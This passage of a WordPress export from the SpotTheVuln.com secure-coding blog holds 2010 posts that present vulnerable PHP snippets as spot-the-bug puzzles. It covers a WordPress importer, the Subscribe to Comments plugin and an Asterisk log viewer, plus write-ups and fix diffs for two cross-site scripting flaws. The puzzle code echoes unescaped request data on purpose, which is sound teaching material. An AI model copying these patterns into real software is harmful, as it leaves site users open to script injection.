		print '<form action="admin.php?import=wp-cat2tag" method="post">';
		print '<p style="text-align:center" class="submit"><input type="submit" value="' . __('Yes') . '" name="yes_convert_all_cats" />&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" value="' . __('No') . '" name="no_dont_do_it" /></p>';
		print '</form>';

		print '</div>';
	}

	function convert_all() {
		global $wpdb;

		$wpdb->query("UPDATE $wpdb->term_taxonomy SET taxonomy = 'post_tag', parent = 0 WHERE taxonomy = 'category'");
		clean_category_cache($category->term_id);
	}

	function init() {
		echo '<!--'; print_r($_POST); print_r($_GET); echo '-->';

		if (isset($_POST['maybe_convert_all_cats'])) {
			$step = 3;
		} elseif (isset($_POST['yes_convert_all_cats'])) {
			$step = 4;
		} elseif (isset($_POST['no_dont_do_it'])) {
			die('no_dont_do_it');
		} else {
			$step = (isset($_GET['step'])) ? (int) $_GET['step'] : 1;
		}

		$this->header();

		if (!current_user_can('manage_categories')) {
			print '<div class="narrow">';
			print '<p>' . __('Cheatin&#8217; uh?') . '</p>';
			print '</div>';
		} else {
			switch ($step) {
				case 1 :
					$this->welcome();
				break;

				case 2 :
					$this->convert_them();
				break;

				case 3 :
					$this->convert_all_confirm();
				break;

				case 4 :
					$this->convert_all();
				break;
			}
		}

		$this->footer();
	}

	function WP_Categories_to_Tags() {
		// Do nothing.
	}
}

$wp_cat2tag_importer = new WP_Categories_to_Tags();

register_importer('wp-cat2tag', __('Categories to Tags Converter'), __('Convert existing categories to tags, selectively.'), array(&$wp_cat2tag_importer, 'init'));

?>

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1195</wp:post_id>
		<wp:post_date>2010-11-08 08:00:56</wp:post_date>
		<wp:post_date_gmt>2010-11-08 15:00:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerability</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/d99TJW]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[6c80fe9c7eb13a2838ef60005124f4df]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>948</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Wordpress Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/11/vulnerability-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-11-12 11:09:48</wp:comment_date>
			<wp:comment_date_gmt>2010-11-12 18:09:48</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Vulnerability [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Vulnerability - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/11/vulnerability-cross-site-scripting/</link>
		<pubDate>Fri, 12 Nov 2010 18:09:42 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1199</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Wordpress (Core)

Fixed in Version: 2.3

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Vulnerability" href="http://spotthevuln.com/2010/11/vulnerability/" target="_blank">Found    Here</a>
<h2>Description</h2>
Interesting bug here, not because of the technical details associated with the bug but more of the process associated with code check in process.  First, the bug is simple, after looking through the code we see a single line that outputs POST and GET parameters into HTML markup.  Although the user controlled values are enclosed within HTML comments, the comment tokens do little to prevent XSS as an attacker can simply break out of the HTML comments.

What’s surprising here is the line of code that causes the XSS appears to be some kind of debugging statement.  Debugging is a necessary function in any large/complex software project.  Developers should have a standard way to tag debugging functionality so that it doesn’t accidently make its way into production builds.  If the debugging functionality were tagged/marked, it would be easy to identify and could have been flagged by simple automation before/during check in time.  This bug also shows that the organization likely doesn’t have robust testing program.  A quick buddy test of this page would have likely identified this issue and it could have been removed.   I’m also guessing that this debugging functionality doesn’t have any test cases associated with it, which would have raised more red flags.

<h2>Developers Solution</h2>
[sourcecode language="diff"]
&lt;?php

	function convert_all_confirm() {
		print '&lt;div class=&quot;narrow&quot;&gt;';

		print '&lt;h3&gt;' . __('Confirm') . '&lt;/h3&gt;';

		print '&lt;p&gt;' . __('You are about to convert all categories to tags. Are you sure you want to continue?') . '&lt;/p&gt;';

		print '&lt;form action=&quot;admin.php?import=wp-cat2tag&quot; method=&quot;post&quot;&gt;';
		print '&lt;p style=&quot;text-align:center&quot; class=&quot;submit&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;' . __('Yes') . '&quot; name=&quot;yes_convert_all_cats&quot; /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;' . __('No') . '&quot; name=&quot;no_dont_do_it&quot; /&gt;&lt;/p&gt;';
		print '&lt;/form&gt;';

		print '&lt;/div&gt;';
	}

	function convert_all() {
		global $wpdb;

		$wpdb-&gt;query(&quot;UPDATE $wpdb-&gt;term_taxonomy SET taxonomy = 'post_tag', parent = 0 WHERE taxonomy = 'category'&quot;);
		clean_category_cache($category-&gt;term_id);
	}

	function init() {
-		echo '&lt;!--'; print_r($_POST); print_r($_GET); echo '--&gt;';

		if (isset($_POST['maybe_convert_all_cats'])) {
			$step = 3;
		} elseif (isset($_POST['yes_convert_all_cats'])) {
			$step = 4;
		} elseif (isset($_POST['no_dont_do_it'])) {
			die('no_dont_do_it');
		} else {
			$step = (isset($_GET['step'])) ? (int) $_GET['step'] : 1;
		}

		$this-&gt;header();

		if (!current_user_can('manage_categories')) {
			print '&lt;div class=&quot;narrow&quot;&gt;';
			print '&lt;p&gt;' . __('Cheatin&amp;#8217; uh?') . '&lt;/p&gt;';
			print '&lt;/div&gt;';
		} else {
			switch ($step) {
				case 1 :
					$this-&gt;welcome();
				break;

				case 2 :
					$this-&gt;convert_them();
				break;

				case 3 :
					$this-&gt;convert_all_confirm();
				break;

				case 4 :
					$this-&gt;convert_all();
				break;
			}
		}

		$this-&gt;footer();
	}

	function WP_Categories_to_Tags() {
		// Do nothing.
	}
}

$wp_cat2tag_importer = new WP_Categories_to_Tags();

register_importer('wp-cat2tag', __('Categories to Tags Converter'), __('Convert existing categories to tags, selectively.'), array(&amp;$wp_cat2tag_importer, 'init'));

?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1199</wp:post_id>
		<wp:post_date>2010-11-12 11:09:42</wp:post_date>
		<wp:post_date_gmt>2010-11-12 18:09:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerability-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="automation"><![CDATA[automation]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="markup"><![CDATA[markup]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="red-flags"><![CDATA[red flags]]></category>
		<category domain="post_tag" nicename="test-cases"><![CDATA[test cases]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bXaXdw]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[76cda016e578d1089f292b5c6d4641c1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Covet</title>
		<link>http://spotthevuln.com/2010/11/covet/</link>
		<pubDate>Mon, 15 Nov 2010 15:00:46 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1203</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>...in order to make a man or a boy covet a thing, it is only necessary to make the thing difficult to obtain.</strong><strong>
</strong> <strong> -Mark Twain
</strong></blockquote>

<pre lang="php">
<?php

/* ================= */
/* Display Functions */
/* ================= */

/* -------------------------
What follows are the functions that display things in your comments form.
Feel free to customize them to your needs
------------------------- */

/* -------------------------
This is the code that is inserted into your comment form.  You may modify it, if you wish.
------------------------- */
function show_subscription_checkbox ($id='0') {
	global $sg_subscribe;
	sg_subscribe_start();

	if ( $sg_subscribe->checkbox_shown ) return $id;
	if ( !$email = $sg_subscribe->current_viewer_subscription_status() ) : ?>

<?php /* ------------------------------------------------------------------- */ ?>
<?php /* This is the text that is displayed for users who are NOT subscribed */ ?>
<?php /* ------------------------------------------------------------------- */ ?>

	<p <?php if ($sg_subscribe->clear_both) echo 'style="clear: both;" '; ?>class="subscribe-to-comments">
        <input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" <?php if ($sg_subscribe->default_subscribed) echo 'checked="checked" '; ?>/>
        <label for="subscribe"><?php echo $sg_subscribe->not_subscribed_text; ?></label>
	</p>

<?php /* ------------------------------------------------------------------- */ ?>

<?php elseif ( $email == 'admin' && current_user_can('manage_options') ) : ?>

<?php /* ------------------------------------------------------------- */ ?>
<?php /* This is the text that is displayed for the author of the post */ ?>
<?php /* ------------------------------------------------------------- */ ?>

	<p <?php if ($sg_subscribe->clear_both) echo 'style="clear: both;" '; ?>class="subscribe-to-comments">
	<?php echo str_replace('[manager_link]', $sg_subscribe->manage_link($email, true, false), $sg_subscribe->author_text); ?>
	</p>

<?php else : ?>

<?php /* --------------------------------------------------------------- */ ?>
<?php /* This is the text that is displayed for users who ARE subscribed */ ?>
<?php /* --------------------------------------------------------------- */ ?>

	<p <?php if ($sg_subscribe->clear_both) echo 'style="clear: both;" '; ?>class="subscribe-to-comments">
	<?php echo str_replace('[manager_link]', $sg_subscribe->manage_link($email, true, false), $sg_subscribe->subscribed_text); ?>
	</p>

<?php /* --------------------------------------------------------------- */ ?>

<?php endif;

$sg_subscribe->checkbox_shown = true;
return $id;
}



/* -------------------------------------------------------------------- */
/* This function outputs a "subscribe without commenting" form.         */
/* Place this somewhere within "the loop", but NOT within another form  */
/* This is NOT inserted automaticallly... you must place it yourself    */
/* -------------------------------------------------------------------- */
function show_manual_subscription_form () {
	global $id, $sg_subscribe, $user_email;
	sg_subscribe_start();
	$sg_subscribe->show_errors('solo_subscribe', '<div class="solo-subscribe-errors">', '</div>', __('<strong>Error: </strong>', 'subscribe-to-comments'), '<br />');

if ( !$sg_subscribe->current_viewer_subscription_status() ) :
	get_currentuserinfo(); ?>

<?php /* ------------------------------------------------------------------- */ ?>
<?php /* This is the text that is displayed for users who are NOT subscribed */ ?>
<?php /* ------------------------------------------------------------------- */ ?>

	<form action="http://<?php echo $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] ?>" method="post">
	<input type="hidden" name="solo-comment-subscribe" value="solo-comment-subscribe" />
	<input type="hidden" name="postid" value="<?php echo $id; ?>" />
	<input type="hidden" name="ref" value="<?php echo 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>" />

	<p class="solo-subscribe-to-comments">
	<?php _e('Subscribe without commenting', 'subscribe-to-comments'); ?>
	<br />
	<label for="solo-subscribe-email"><?php _e('E-Mail:', 'subscribe-to-comments'); ?>
	<input type="text" name="email" id="solo-subscribe-email" size="22" value="<?php echo $user_email; ?>" /></label>
	<input type="submit" name="submit" value="<?php _e('Subscribe', 'subscribe-to-comments'); ?>" />
	</p>
	</form>

<?php /* ------------------------------------------------------------------- */ ?>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1203</wp:post_id>
		<wp:post_date>2010-11-15 08:00:46</wp:post_date>
		<wp:post_date_gmt>2010-11-15 15:00:46</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>covet</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/9nWoYD]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[3f0957e0a6cbe3648d1bb29599362544]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>985</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/11/covet-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-11-19 08:07:51</wp:comment_date>
			<wp:comment_date_gmt>2010-11-19 15:07:51</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Covet [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Covet - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/11/covet-cross-site-scripting/</link>
		<pubDate>Fri, 19 Nov 2010 15:00:45 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1207</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Subscribe to Comments Plugin

Fixed in Version: 2.1

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Covet" href="http://spotthevuln.com/2010/11/covet/" target="_blank">Found    Here</a>
<h2>Description</h2>
A familiar symptom here with the same ole result.  In the vulnerable code we see a call to $_SERVER['REQUEST_URI'].  For some reason, many developers assume REQUEST_URI cannot be tainted and used for XSS.  REQUEST_URI will not only include the path to current php file, it will also include any querystring parameters in the URI as well.  Here's a few examples of what REQUEST_URI will return:
<blockquote>http://spotthevuln.com/blah/
results in --&gt; /

http://spotthevuln.com/blah//index.php
results in --&gt; /blah/index.php

http://spotthevuln.com/blah/index.php?qs=value
results in --&gt; /blah/index.php?qs=value

http://spotthevuln.com/blah/index.php/qs1/qs2
results in --&gt; /blah/index.php/qs1/qs2</blockquote>
As you can see an attacker can easily taint the REQUEST_URI value, using it in XSS attacks.  The developers addressed this vulnerability by encoding calls to REQUEST_URI.
<h2>Developers Solution</h2>
[sourcecode language="diff"]
&lt;?php

/* ================= */
/* Display Functions */
/* ================= */

/* -------------------------
What follows are the functions that display things in your comments form.
Feel free to customize them to your needs
------------------------- */

/* -------------------------
This is the code that is inserted into your comment form.  You may modify it, if you wish.
------------------------- */
function show_subscription_checkbox ($id='0') {
	global $sg_subscribe;
	sg_subscribe_start();

	if ( $sg_subscribe-&gt;checkbox_shown ) return $id;
	if ( !$email = $sg_subscribe-&gt;current_viewer_subscription_status() ) : ?&gt;

&lt;?php /* ------------------------------------------------------------------- */ ?&gt;
&lt;?php /* This is the text that is displayed for users who are NOT subscribed */ ?&gt;
&lt;?php /* ------------------------------------------------------------------- */ ?&gt;

	&lt;p &lt;?php if ($sg_subscribe-&gt;clear_both) echo 'style=&quot;clear: both;&quot; '; ?&gt;class=&quot;subscribe-to-comments&quot;&gt;
        &lt;input type=&quot;checkbox&quot; name=&quot;subscribe&quot; id=&quot;subscribe&quot; value=&quot;subscribe&quot; style=&quot;width: auto;&quot; &lt;?php if ($sg_subscribe-&gt;default_subscribed) echo 'checked=&quot;checked&quot; '; ?&gt;/&gt;
        &lt;label for=&quot;subscribe&quot;&gt;&lt;?php echo $sg_subscribe-&gt;not_subscribed_text; ?&gt;&lt;/label&gt;
	&lt;/p&gt;

&lt;?php /* ------------------------------------------------------------------- */ ?&gt;

&lt;?php elseif ( $email == 'admin' &amp;&amp; current_user_can('manage_options') ) : ?&gt;

&lt;?php /* ------------------------------------------------------------- */ ?&gt;
&lt;?php /* This is the text that is displayed for the author of the post */ ?&gt;
&lt;?php /* ------------------------------------------------------------- */ ?&gt;

	&lt;p &lt;?php if ($sg_subscribe-&gt;clear_both) echo 'style=&quot;clear: both;&quot; '; ?&gt;class=&quot;subscribe-to-comments&quot;&gt;
	&lt;?php echo str_replace('[manager_link]', $sg_subscribe-&gt;manage_link($email, true, false), $sg_subscribe-&gt;author_text); ?&gt;
	&lt;/p&gt;

&lt;?php else : ?&gt;

&lt;?php /* --------------------------------------------------------------- */ ?&gt;
&lt;?php /* This is the text that is displayed for users who ARE subscribed */ ?&gt;
&lt;?php /* --------------------------------------------------------------- */ ?&gt;

	&lt;p &lt;?php if ($sg_subscribe-&gt;clear_both) echo 'style=&quot;clear: both;&quot; '; ?&gt;class=&quot;subscribe-to-comments&quot;&gt;
	&lt;?php echo str_replace('[manager_link]', $sg_subscribe-&gt;manage_link($email, true, false), $sg_subscribe-&gt;subscribed_text); ?&gt;
	&lt;/p&gt;

&lt;?php /* --------------------------------------------------------------- */ ?&gt;

&lt;?php endif;

$sg_subscribe-&gt;checkbox_shown = true;
return $id;
}

/* -------------------------------------------------------------------- */
/* This function outputs a &quot;subscribe without commenting&quot; form.         */
/* Place this somewhere within &quot;the loop&quot;, but NOT within another form  */
/* This is NOT inserted automaticallly... you must place it yourself    */
/* -------------------------------------------------------------------- */
function show_manual_subscription_form () {
	global $id, $sg_subscribe, $user_email;
	sg_subscribe_start();
	$sg_subscribe-&gt;show_errors('solo_subscribe', '&lt;div class=&quot;solo-subscribe-errors&quot;&gt;', '&lt;/div&gt;', __('&lt;strong&gt;Error: &lt;/strong&gt;', 'subscribe-to-comments'), '&lt;br /&gt;');

if ( !$sg_subscribe-&gt;current_viewer_subscription_status() ) :
	get_currentuserinfo(); ?&gt;

&lt;?php /* ------------------------------------------------------------------- */ ?&gt;
&lt;?php /* This is the text that is displayed for users who are NOT subscribed */ ?&gt;
&lt;?php /* ------------------------------------------------------------------- */ ?&gt;

-	&lt;form action=&quot;http://&lt;?php echo $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] ?&gt;&quot; method=&quot;post&quot;&gt;
+	&lt;form action=&quot;http://&lt;?php echo $_SERVER['HTTP_HOST'] . wp_specialchars($_SERVER['REQUEST_URI']); ?&gt;&quot; method=&quot;post&quot;&gt;
	&lt;input type=&quot;hidden&quot; name=&quot;solo-comment-subscribe&quot; value=&quot;solo-comment-subscribe&quot; /&gt;
	&lt;input type=&quot;hidden&quot; name=&quot;postid&quot; value=&quot;&lt;?php echo $id; ?&gt;&quot; /&gt;
-	&lt;input type=&quot;hidden&quot; name=&quot;ref&quot; value=&quot;&lt;?php echo 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?&gt;&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;ref&quot; value=&quot;&lt;?php echo urlencode('http://' . $_SERVER['HTTP_HOST'] . wp_specialchars($_SERVER['REQUEST_URI'])); ?&gt;&quot; /&gt;

	&lt;p class=&quot;solo-subscribe-to-comments&quot;&gt;
	&lt;?php _e('Subscribe without commenting', 'subscribe-to-comments'); ?&gt;
	&lt;br /&gt;
	&lt;label for=&quot;solo-subscribe-email&quot;&gt;&lt;?php _e('E-Mail:', 'subscribe-to-comments'); ?&gt;
	&lt;input type=&quot;text&quot; name=&quot;email&quot; id=&quot;solo-subscribe-email&quot; size=&quot;22&quot; value=&quot;&lt;?php echo $user_email; ?&gt;&quot; /&gt;&lt;/label&gt;
	&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;&lt;?php _e('Subscribe', 'subscribe-to-comments'); ?&gt;&quot; /&gt;
	&lt;/p&gt;
	&lt;/form&gt;

&lt;?php /* ------------------------------------------------------------------- */ ?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1207</wp:post_id>
		<wp:post_date>2010-11-19 08:00:45</wp:post_date>
		<wp:post_date_gmt>2010-11-19 15:00:45</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>covet-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="all-vulnerabilities"><![CDATA[All Vulnerabilities]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="querystring"><![CDATA[querystring]]></category>
		<category domain="post_tag" nicename="request-uri"><![CDATA[request uri]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_6e7899438737758429f668ffc4f8bf93</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_54e49ebe6fc45058afde7de1c0982440</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_297d67a1875888a6cd685484344937de</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/c1fjQ9]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[09120d7377348673c7f83a71550e4a26]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_73799e56daf662700f44b5a7cb757b0b</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_86a20ff086320a1e5e54d1431c4c0075</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_fe268eaabf4a8919db6d22828471e10f</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Australia</title>
		<link>http://spotthevuln.com/2010/11/australia/</link>
		<pubDate>Mon, 22 Nov 2010 15:00:02 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1211</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Don't worry about the world coming to an end today. It is already tomorrow in Australia.</strong> <br><strong> -Charles M Schulz
</strong></blockquote>
<pre lang="php"><?php

$display = $_REQUEST['display'];
$type = isset($_REQUEST['type']) ? $_REQUEST['type'] : 'tool';
$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';

?>
</div>
<div>
<?php

switch($action) {
case 'showlog':
?>
<h2>
<?php echo sprintf(_('%s - last 2000 lines'),$amp_conf['ASTLOGDIR']."/full") ?>
</h2>
<a href="config.php?<?php echo "display=$display&type=$type&action=showlog"?>"><?php echo _("Redisplay Asterisk Full debug log (last 2000 lines)") ?></a><br>
<hr><br>
<?php
echo system ('tail --line=2000 '.$amp_conf['ASTLOGDIR'].'/full | sed -e "s/$/<br>/"');
break;

default:
echo "<h2>"._("Asterisk Log Files")."</h2>";
?>
<a href="config.php?<?php echo "display=$display&type=$type&action=showlog"?>"><?php echo _("Display Asterisk Full debug log (last 2000 lines)") ?></a><br>
<br><br><br><br><br><br><br><br><br><br><br><br>
<?php
break;
}
?>
</div>

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1211</wp:post_id>
		<wp:post_date>2010-11-22 08:00:02</wp:post_date>
		<wp:post_date_gmt>2010-11-22 15:00:02</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
